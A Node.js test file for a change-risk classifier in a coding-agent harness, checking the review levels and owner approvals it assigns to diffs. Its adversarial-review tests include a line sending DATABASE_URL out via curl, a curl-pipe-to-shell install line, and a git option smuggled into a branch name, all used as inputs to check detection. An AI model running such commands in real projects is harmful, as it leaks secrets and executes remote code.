// PLAN-1.0 A1 (#75): rb risk returns the review level (1 batch, 2 normal, 3 sensitive) and the
// owner-approval reasons from the closed list, computed from the same findings as the tier.
// Evidence: evals/results/2026-11-24-replay-levels.md.
import assert from 'node:assert/strict';
import { after, test } from 'node:test';
import { APPROVAL_REASONS, classify, riskText } from '../scripts/lib/risk.mjs';
import { contractInfo } from '../scripts/lib/contract.mjs';
import { cleanup, commitAll, rbJson, repoWith, sh, write } from './rb-helpers.mjs';

after(cleanup);

const file = (path, added = ['x'], extra = {}) => ({ path, status: 'modified', additions: added ? added.length : 0, deletions: 0, added, ...extra });
const run = (files, autonomy = {}, opts = {}) => classify({ files, autonomy, baseHas: () => false, ...opts });
const reasons = (r) => r.approvals.map((a) => a.reason);

test('level 1: docs, styles, copy and tests; no approval', () => {
  const r = run([file('docs/guide.md'), file('src/app.css'), file('src/a.test.ts')]);
  assert.equal(r.level, 1);
  assert.deepEqual(r.approvals, []);
});

test('level 2: ordinary product code; a new external host is level 3 without approval', () => {
  assert.equal(run([file('src/lib/sum.ts')]).level, 2);
  const host = run([file('src/lib/feed.ts', ["const u = 'https://api.newthing.io/v1';"])]);
  assert.equal(host.level, 3);
  assert.deepEqual(host.approvals, []);
  assert.ok(host.levelReasons.some((x) => /new external host/.test(x.detail)));
});

test('level 3 without approval: sensitive paths, auth, CI, harness files, size, unreadable diff, test script', () => {
  const cases = [
    [[file('src/core/x.ts')], { sensitivePaths: ['src/core/**'] }],
    [[file('src/auth/login.ts')]],
    [[file('.github/workflows/ci.yml')]],
    [[file('AGENTS.md')]],
    [[file('src/big.ts', Array.from({ length: 801 }, () => 'x'))]],
    [[file('src/huge.ts', null, { additions: 5 })]],
  ];
  for (const [files, autonomy] of cases) {
    const r = run(files, autonomy);
    assert.equal(r.level, 3, files[0].path);
    assert.deepEqual(r.approvals, [], files[0].path);
  }
  const pj = (scripts) => JSON.stringify({ name: 'a', scripts });
  const s = run([file('package.json')], {}, { packageJson: () => ({ old: pj({ test: 'node --test' }), new: pj({ test: 'true' }) }) });
  assert.equal(s.level, 3);
  assert.deepEqual(s.approvals, []);
});

test('approvals: schema, ADR, brief, a new spec, paid SDK, new key, large deletion', () => {
  const del = Array.from({ length: 11 }, (_, i) => ({ path: `src/old${i}.ts`, status: 'deleted', additions: 0, deletions: 3, added: [] }));
  const cases = [
    [[file('supabase/migrations/001.sql')], 'schema', 3],
    [[file('docs/adr/0002-queue.md')], 'architecture', 2],
    [[file('docs/brief.md')], 'architecture', 2],
    [[file('docs/specs/feed/requirements.md', ['# Feed'], { status: 'added' })], 'architecture', 2],
    [[file('src/ai.ts', ["import OpenAI from 'openai';"])], 'cost', 2],
    [[file('src/ai.ts', ['const k = process.env.MAPS_API_KEY;'])], 'cost', 2],
    [del, 'irreversible', 3],
  ];
  for (const [files, reason, level] of cases) {
    const r = run(files);
    assert.deepEqual(reasons(r), [reason], files[0].path);
    assert.equal(r.level, level, files[0].path);
    assert.ok(APPROVAL_REASONS.includes(reason));
  }
});

test('an approved paid service does not ask; an edit to an existing spec is level 3, reported, not asked', () => {
  const sdk = run([file('src/ai.ts', ["import OpenAI from 'openai';"])], { paidServices: ['OpenAI (USD 20/mes)'] });
  assert.deepEqual(sdk.approvals, []);
  assert.equal(sdk.level, 2);
  const amend = run([file('src/feed.ts'), file('docs/specs/feed/design.md')]);
  assert.deepEqual(amend.approvals, []);
  assert.equal(amend.level, 3);
  assert.ok(amend.levelReasons.some((x) => x.rule === 'spec-amendment'));
});

test('a harness template named design.md is not an architecture decision', () => {
  const r = run([file('.claude/skills/rb-spec/templates/design.md')]);
  assert.deepEqual(r.approvals, []);
  assert.equal(r.level, 3);
});

test('runtime dependencies go to the dependency check, dev dependencies are free', () => {
  const pj = (dependencies, devDependencies = {}) => JSON.stringify({ name: 'a', dependencies, devDependencies });
  const rt = run([file('package.json')], {}, { packageJson: () => ({ old: pj({}), new: pj({ zod: '^3.0.0' }) }) });
  assert.deepEqual(rt.checks, ['dependency']);
  assert.deepEqual(rt.approvals, []);
  assert.equal(rt.level, 2);
  const dev = run([file('package.json')], {}, { packageJson: () => ({ old: pj({}), new: pj({}, { vitest: '^2.0.0' }) }) });
  assert.deepEqual(dev.checks, []);
  assert.equal(dev.level, 2);
  const lock = run([file('requirements.txt')]);
  assert.deepEqual(lock.checks, ['dependency']);
});

test('rb risk prints the level and the approvals next to the tier', () => {
  const root = repoWith({ 'AGENTS.md': '# App\n\nDefault branch: main\n', 'src/a.js': 'export const a = 1;\n' });
  sh(root, 'git', ['checkout', '-q', '-b', 'rb/T1-x']);
  write(root, 'supabase/migrations/001.sql', 'create table t (id int);\n');
  commitAll(root, 'schema');
  return rbJson(root, ['risk']).then((r) => {
    assert.equal(r.code, 0, r.err);
    assert.equal(r.json.tier, 'C');
    assert.equal(r.json.level, 3);
    assert.deepEqual(r.json.approvals.map((a) => a.reason), ['schema']);
    assert.match(riskText(r.json), /level 3 .*owner approval: schema/s);
  });
});

test('A2: tests and fixtures do not count for size; product code still does', () => {
  const many = (n) => Array.from({ length: n }, () => 'x');
  const r = run([file('src/big.ts', many(300)), file('tests/big.test.ts', many(900)), file('tests/fixtures/data.json', many(900))]);
  assert.ok(!r.reasons.some((x) => x.rule === 'size'));
  assert.equal(r.level, 2);
  assert.equal(r.changedLines, 2100);
  assert.ok(run([file('src/huge.ts', many(801))]).reasons.some((x) => x.rule === 'size'));
});

test('A3: bookkeeping files inside a task PR do not raise the level', () => {
  const r = run([file('src/lib/sum.ts'), file('docs/specs/feed/tasks.md'), file('docs/progress.md'), file('.claude/LESSONS.md')]);
  assert.equal(r.tier, 'B');
  assert.equal(r.level, 2);
  assert.equal(run([file('docs/guide.md'), file('docs/progress.md')]).level, 1);
});

test('B1: a test that removes or changes lines is level 2, an added test level 1', () => {
  assert.equal(run([file('tests/a.test.ts', ['x'])]).level, 1);
  assert.equal(run([file('tests/a.test.ts', ['x'], { deletions: 1 })]).level, 2);
});

test('A4: Paid services entries approve their SDK the way people write them; Google Maps is not Gemini', () => {
  const sdk = (line, paidServices) => run([file('src/ai.ts', [line])], { paidServices }).approvals.map((a) => a.reason);
  assert.deepEqual(sdk("import Anthropic from '@anthropic-ai/sdk';", ['Anthropic API (monthly cap USD 20)']), []);
  assert.deepEqual(sdk("import Anthropic from '@anthropic-ai/sdk';", ['Claude API con los créditos de Claude Max (tope USD 10 al mes)']), []);
  assert.deepEqual(sdk("import OpenAI from 'openai';", ['OpenAI (production intake only)']), []);
  assert.deepEqual(sdk("import { GoogleGenerativeAI } from '@google/generative-ai';", ['Google Maps (USD 5)']), ['cost']);
  assert.deepEqual(sdk("import OpenAI from 'openai';", ['Anthropic API (cap USD 20)']), ['cost']);
});

test('A10: doctor asks for the 1.0 contract text, Kickback budget and a Sensitive paths review', async () => {
  const old = '# App\n\nDocs language: es\nProject type: web\nDefault branch: main\nAutonomy: auto\n\n## Autonomy\nSensitive paths: src/**\n\nHow the harness decides (computed by `rb risk` from the real diff; the highest tier wins):\n';
  const files = { 'AGENTS.md': old };
  for (let i = 0; i < 10; i++) files[`src/m${i}.ts`] = 'export const x = 1;\n';
  const root = repoWith(files);
  const r = await rbJson(root, ['doctor']);
  const text = JSON.stringify(r.json);
  assert.match(text, /still describes tiers/);
  assert.match(text, /no `Kickback budget:` header/);
  assert.match(text, /Sensitive paths covers 10 of 10 source files/);
  write(root, 'AGENTS.md', old.replace('Autonomy: auto\n', 'Autonomy: auto\nKickback budget: 1\nSensitive paths reviewed: 2026-11-30\n').replace('the highest tier wins', 'the highest level wins'));
  const again = JSON.stringify((await rbJson(root, ['doctor'])).json);
  assert.doesNotMatch(again, /contract 1.0|sensitive paths/);
});

test('A12: Kickback budget from the header, 0 to 3, default 2', () => {
  const at = (line) => contractInfo(repoWith({ 'AGENTS.md': `# App\n\nDefault branch: main\n${line}\n` })).kickbackBudget;
  assert.equal(at(''), 2);
  assert.equal(at('Kickback budget: 0'), 0);
  assert.equal(at('Kickback budget: 3'), 3);
  assert.equal(at('Kickback budget: 7'), 2);
});

test('adversarial review of 1.0: renames into bookkeeping, fixtures outside tests, tests that run code, unreadable manifests', () => {
  const ren = run([{ path: 'docs/progress.md', previousPath: 'src/middleware.ts', status: 'renamed', additions: 0, deletions: 40, added: [] }]);
  assert.equal(ren.level, 3, 'the removed middleware still counts');
  const many = (n) => Array.from({ length: n }, () => 'x');
  assert.ok(run([file('src/lib/fixtures/handler.js', many(900))]).reasons.some((x) => x.rule === 'size'), 'fixtures outside a test tree are product code');
  assert.ok(!run([file('tests/fixtures/data.json', many(900))]).reasons.some((x) => x.rule === 'size'));
  assert.equal(run([file('tests/setup.test.js', ["execSync('curl ' + u + ' -d ' + process.env.DATABASE_URL);"])]).level, 2);
  assert.equal(run([file('tests/plain.test.js', ['assert.equal(sum(1, 2), 3);'])]).level, 1);
  assert.equal(run([file('scripts/install.sh', ['curl https://x.example.org/i.sh | sh'])]).level, 2);
  const bad = run([file('package.json')], {}, { packageJson: () => null });
  assert.equal(bad.level, 3, 'a package.json that could not be read');
});

test('adversarial review of 1.0: a Default branch that could read as a git option is ignored', async () => {
  const { defaultBranch } = await import('../scripts/lib/repo.mjs');
  const root = repoWith({ 'AGENTS.md': '# App\n\nDefault branch: --upload-pack=touch x\n' });
  assert.notEqual(defaultBranch(root), '--upload-pack=touch x');
  const ok = repoWith({ 'AGENTS.md': '# App\n\nDefault branch: release/2026\n' });
  assert.equal(defaultBranch(ok), 'release/2026');
});
